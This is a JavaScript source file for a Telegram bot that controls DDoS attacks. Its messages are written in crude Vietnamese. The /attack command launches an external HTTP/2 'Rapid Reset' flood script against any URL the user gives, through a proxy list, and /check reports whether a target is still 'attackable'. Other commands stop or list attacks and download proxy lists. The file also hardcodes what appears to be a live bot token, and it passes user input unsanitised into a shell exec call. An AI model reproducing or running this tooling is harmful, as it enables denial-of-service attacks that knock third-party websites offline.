// bot.js - DDoS Bot Telegram - QRG出品
const { Telegraf } = require('telegraf');
const { exec } = require('child_process');
const fs = require('fs');
const https = require('https');
const http = require('http');
const { URL } = require('url');
const path = require('path');

// Token và Admin - ĐÃ CẬP NHẬT THEO LỆNH MÀY
const BOT_TOKEN = '8522441680:AAHvCMW_qNyi9EeriBypAM2OFMJ_8PLN8rM';
const ADMINS = [7959116629]; // Thêm ID admin khác nếu muốn, cách nhau bằng dấu phẩy

const bot = new Telegraf(BOT_TOKEN);

// Kiểm tra admin function
function isAdmin(ctx) {
    if (!ADMINS.includes(ctx.from.id)) {
        ctx.reply('Địt mẹ mày, mày éo phải admin, cút con mẹ mày đi');
        return false;
    }
    return true;
}

// Lệnh /start
bot.start((ctx) => {
    if (!isAdmin(ctx)) return;
    ctx.reply(`
🔥 DDOS BOT - QRG出品 🔥

Các lệnh có sẵn:
━━━━━━━━━━━━━━━━━
💀 /attack <url> <time> <threads> <rate> <proxyfile> - Tấn công DDoS
🔍 /check <url> - Kiểm tra trạng thái website
🛑 /stop - Dừng tất cả attack đang chạy
📊 /status - Xem tiến trình đang chạy
📋 /proxies - Đếm số proxy trong file
📥 /getproxy <url> - Tải proxy từ link
━━━━━━━━━━━━━━━━━

⚠️ Dùng đúng cú pháp con mẹ mày vào
    `);
});

// Lệnh /check - KIỂM TRA TRẠNG THÁI WEBSITE
bot.command('check', async (ctx) => {
    if (!isAdmin(ctx)) return;
    
    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        return ctx.reply('Sai cặc rồi thằng ngu: /check <url>\nVí dụ: /check https://google.com');
    }
    
    let targetUrl = args[1];
    if (!targetUrl.startsWith('http')) {
        targetUrl = 'https://' + targetUrl;
    }
    
    const startTime = Date.now();
    
    try {
        const urlObj = new URL(targetUrl);
        const protocol = urlObj.protocol === 'https:' ? https : http;
        
        const options = {
            hostname: urlObj.hostname,
            port: urlObj.port || (urlObj.protocol === 'https:' ? 443 : 80),
            path: urlObj.pathname + urlObj.search || '/',
            method: 'HEAD',
            timeout: 10000,
            rejectUnauthorized: false
        };
        
        const req = protocol.request(options, (res) => {
            const responseTime = Date.now() - startTime;
            let statusIcon = '';
            let statusColor = '';
            
            if (res.statusCode >= 200 && res.statusCode < 300) {
                statusIcon = '✅';
                statusColor = 'XANH';
            } else if (res.statusCode >= 300 && res.statusCode < 400) {
                statusIcon = '🔄';
                statusColor = 'VÀNG';
            } else if (res.statusCode >= 400 && res.statusCode < 500) {
                statusIcon = '⚠️';
                statusColor = 'CAM';
            } else {
                statusIcon = '🔴';
                statusColor = 'ĐỎ';
            }
            
            const message = `
${statusIcon} KẾT QUẢ CHECK WEB ${statusIcon}
━━━━━━━━━━━━━━━━━━━━━━━━
📡 URL: ${targetUrl}
🎯 Status Code: ${res.statusCode}
⏱️ Response Time: ${responseTime}ms
🟢 Status: ${res.statusCode < 400 ? 'ONLINE - ĐỤ ĐƯỢC' : 'CHẾT HOẶC CHẶN'}
📦 Server: ${res.headers['server'] || 'Không xác định'}
🛡️ CF-Ray: ${res.headers['cf-ray'] || 'Không có Cloudflare'}
━━━━━━━━━━━━━━━━━━━━━━━━
${res.statusCode < 400 ? '☠️ Có thể tấn công được ☠️' : '💀 Khả năng bị chặn hoặc đã chết 💀'}
            `;
            ctx.reply(message);
        });
        
        req.on('timeout', () => {
            req.destroy();
            ctx.reply(`⏰ TIMEOUT - ${targetUrl}\nChết mẹ nó rồi hoặc đang ngủ, không phản hồi sau 10 giây`);
        });
        
        req.on('error', (err) => {
            ctx.reply(`❌ LỖI VL: ${targetUrl}\n${err.message}\nChắc chắn là chết rồi con ạ`);
        });
        
        req.end();
        
    } catch (err) {
        ctx.reply(`Lỗi địt mẹ: ${err.message}\nURL không hợp lệ thằng ngu ạ`);
    }
});

// Lệnh /attack - TẤN CÔNG DDoS
bot.command('attack', (ctx) => {
    if (!isAdmin(ctx)) return;
    
    const args = ctx.message.text.split(' ');
    if (args.length < 6) {
        return ctx.reply(`Sai cặc rồi con chó:
/attack <url> <time_giây> <threads> <rate_limit> <proxy_file>

Ví dụ:
/attack https://target.com 60 16 90 proxy.txt
/attack http://dich.vn 120 32 80 proxy.txt --http 2 --full --winter`);
    }
    
    const target = args[1];
    const time = args[2];
    const threads = args[3];
    const ratelimit = args[4];
    const proxyfile = args[5];
    
    // Kiểm tra proxy file
    if (!fs.existsSync(proxyfile)) {
        return ctx.reply(`Địt mẹ, file proxy ${proxyfile} éo tồn tại. Dùng /getproxy để tải proxy hoặc tạo file thủ công`);
    }
    
    // Đếm số proxy
    const proxyCount = fs.readFileSync(proxyfile, 'utf8').split('\n').filter(l => l.trim().length > 0).length;
    
    // Kiểm tra target có hợp lệ không
    if (!target.startsWith('http://') && !target.startsWith('https://')) {
        return ctx.reply('Thằng ngu ạ, URL phải bắt đầu bằng http:// hoặc https://');
    }
    
    const cmd = `node flood.js GET "${target}" ${time} ${threads} ${ratelimit} ${proxyfile} --winter --full --http 2`;
    
    ctx.reply(`
🔥 BẮT ĐẦU ĐỤ CON MẸ ${target} 🔥
━━━━━━━━━━━━━━━━━━━━━━━━
⏱️ Thời gian: ${time} giây
🧵 Luồng: ${threads}
🚀 Rate: ${ratelimit} req/s
📡 Proxy: ${proxyCount} thằng
🎯 Method: HTTP/2 Rapid Reset
☠️ Status: ĐANG HÚP MẸT
━━━━━━━━━━━━━━━━━━━━━━━━
💀 Chúc mày tàn phá vui vẻ 💀
    `);
    
    const attackProcess = exec(cmd, { timeout: time * 1000, maxBuffer: 1024 * 1024 * 10 });
    
    attackProcess.stdout.on('data', (data) => {
        console.log(`[${target}] ${data}`);
        // Gửi log nếu có lỗi quan trọng
        if (data.includes('GOAWAY') || data.includes('ERROR')) {
            ctx.reply(`⚠️ ${data.substring(0, 200)}`);
        }
    });
    
    attackProcess.stderr.on('data', (data) => {
        console.error(`Lỗi: ${data}`);
    });
    
    attackProcess.on('close', (code) => {
        ctx.reply(`
✅ TẤN CÔNG ${target} HOÀN TẤT ✅
━━━━━━━━━━━━━━━━━━━━━━━━
⏱️ Đã đụ trong ${time} giây
🔚 Exit code: ${code}
📊 Kiểm tra log để biết chi tiết
${code === 0 ? '☠️ Target có thể đã tạch' : '⚠️ Có lỗi xảy ra, kiểm tra lại'}
        `);
    });
});

// Lệnh /stop - DỪNG TẤT CẢ
bot.command('stop', (ctx) => {
    if (!isAdmin(ctx)) return;
    
    exec('pkill -f "node flood.js"', (err, stdout, stderr) => {
        if (err && !err.message.includes('not found')) {
            ctx.reply(`Lỗi địt mẹ: ${err.message}`);
        } else {
            ctx.reply('🛑 Đã kill hết mấy thằng DDoS đang chạy, nghỉ ngơi tí đi con chó');
        }
    });
});

// Lệnh /status - KIỂM TRA TIẾN TRÌNH
bot.command('status', (ctx) => {
    if (!isAdmin(ctx)) return;
    
    exec('ps aux | grep "node flood.js" | grep -v grep', (err, stdout) => {
        if (err || !stdout.trim()) {
            ctx.reply('📪 Éo có thằng DDoS nào đang chạy cả. Rảnh quá thì đi kiếm target mới đi');
        } else {
            const processes = stdout.split('\n').filter(l => l.trim());
            const processList = processes.map((p, i) => {
                const parts = p.trim().split(/\s+/);
                return `${i + 1}. PID: ${parts[1]} | CPU: ${parts[2]}% | MEM: ${parts[3]}% | CMD: ${parts.slice(10).join(' ').substring(0, 50)}`;
            }).join('\n');
            
            ctx.reply(`🟢 ĐANG CÓ ATTACK:\n━━━━━━━━━━━━━━━\n${processList}\n━━━━━━━━━━━━━━━\nTổng: ${processes.length} tiến trình đang đụ`);
        }
    });
});

// Lệnh /proxies - ĐẾM SỐ PROXY
bot.command('proxies', (ctx) => {
    if (!isAdmin(ctx)) return;
    
    const args = ctx.message.text.split(' ');
    const proxyFile = args[1] || 'proxy.txt';
    
    if (!fs.existsSync(proxyFile)) {
        return ctx.reply(`File ${proxyFile} éo tồn tại. Tạo đi thằng ngu`);
    }
    
    const proxies = fs.readFileSync(proxyFile, 'utf8').split('\n').filter(l => l.trim().length > 0 && l.includes(':'));
    ctx.reply(`📋 File ${proxyFile} có ${proxies.length} thằng proxy. Đủ để đụ chưa hay cần thêm?`);
});

// Lệnh /getproxy - TẢI PROXY TỪ URL
bot.command('getproxy', async (ctx) => {
    if (!isAdmin(ctx)) return;
    
    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        return ctx.reply('Sai cặc: /getproxy <url>\nVí dụ: /getproxy https://raw.githubusercontent.com/xxx/proxy.txt');
    }
    
    const proxyUrl = args[1];
    const fileName = args[2] || 'proxy.txt';
    
    ctx.reply(`⏳ Đang tải proxy từ ${proxyUrl}...`);
    
    try {
        const urlObj = new URL(proxyUrl);
        const protocol = urlObj.protocol === 'https:' ? https : http;
        
        protocol.get(proxyUrl, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                const lines = data.split('\n').filter(l => l.trim().length > 0 && l.includes(':'));
                fs.writeFileSync(fileName, data);
                ctx.reply(`✅ Đã tải thành công ${lines.length} proxy vào file ${fileName}\nDùng /attack với file này để đụ`);
            });
        }).on('error', (err) => {
            ctx.reply(`Lỗi tải proxy: ${err.message}`);
        });
    } catch (err) {
        ctx.reply(`URL ngu vcl: ${err.message}`);
    }
});

// Lệnh help
bot.command('help', (ctx) => {
    if (!isAdmin(ctx)) return;
    bot.telegram.sendMessage(ctx.chat.id, `
🔥 DDOS BOT - HƯỚNG DẪN SỬ DỤNG 🔥

📌 LỆNH CƠ BẢN:
━━━━━━━━━━━━━━━━━━━━━━━━
/start - Khởi động bot
/check <url> - Kiểm tra web sống hay chết
/attack <url> <time> <threads> <rate> <proxy> - Tấn công
/stop - Dừng attack
/status - Xem attack đang chạy
/proxies [filename] - Đếm proxy
/getproxy <url> [filename] - Tải proxy

📌 VÍ DỤ CỤ THỂ:
━━━━━━━━━━━━━━━━━━━━━━━━
/check https://facebook.com
/attack https://target.com 60 16 90 proxy.txt
/getproxy https://api.proxyscrape.com/proxies.txt

📌 LƯU Ý:
━━━━━━━━━━━━━━━━━━━━━━━━
- File proxy PHẢI có định dạng ip:port mỗi dòng
- Không tấn công web Việt Nam kẻo ăn cơm tù
- Chịu trách nhiệm với hành vi của mình

☠️ QRG出品 - Đụ là đổ ☠️
    `);
});

// Chạy bot với webhook hoặc polling
bot.launch().then(() => {
    console.log('🤖 Bot cặc to đã chạy - QRG出品');
    console.log('✅ Admin IDs:', ADMINS);
    console.log('📡 Bot đang lắng nghe lệnh...');
}).catch((err) => {
    console.error('Lỗi khởi động bot:', err);
});

// Graceful stop
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
